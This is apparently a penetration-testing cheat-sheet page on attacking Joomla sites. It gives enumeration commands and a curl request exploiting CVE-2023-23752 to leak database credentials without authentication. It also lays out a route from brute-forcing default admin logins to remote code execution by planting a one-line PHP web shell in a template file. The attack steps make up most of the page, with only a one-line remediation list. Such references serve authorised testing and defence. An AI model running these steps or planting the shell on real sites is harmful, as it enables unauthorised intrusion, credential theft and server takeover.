---
tags:
  - Web
---

# :material-joomla: Joomla

<span class="pill pill-medium">CMS</span> <span class="pill pill-info">web</span>

Joomla's core is patched often, so the wins are **weak admin creds → template
edit → RCE**, plus a handful of impactful core CVEs.

!!! abstract "TL;DR"
    `joomscan` to enumerate → brute the admin at `/administrator` → edit a template
    PHP file for RCE. Check the version for the unauth API-info leak CVE-2023-23752.

## :material-magnify: Identify & enumerate

```bash
curl -s http://$TARGET/administrator/manifests/files/joomla.xml   # exact version
curl -s http://$TARGET/language/en-GB/en-GB.xml
joomscan --url http://$TARGET
droopescan scan joomla -u http://$TARGET
```

!!! loot "CVE-2023-23752 — unauth config leak"
    ```bash
    curl -s "http://$TARGET/api/index.php/v1/config/application?public=true"
    ```
    Leaks DB credentials (`user`, `password`, `host`) with no auth on affected
    4.x versions — straight to the database and often reused elsewhere.

## :material-fire: Admin → RCE

```text
# /administrator → brute (admin:admin, admin:<sitename>)
# Extensions → Templates → Customise → edit an active template's PHP (e.g. error.php)
#   <?php system($_GET['c']); ?>  → /templates/<tpl>/error.php?c=id
```

## :material-shield-check: Remediation

- Patch core; strong admin creds + 2FA; restrict `/administrator` by IP;
  disable the public config API.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Leaked DB creds → [MSSQL](../network/mssql.md)/[SQLi](../web/sqli.md); shell → [Linux Privesc](../privesc/linux.md).
- Reference: [joomscan](https://github.com/OWASP/joomscan), [HackTricks Joomla](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/joomla.html).
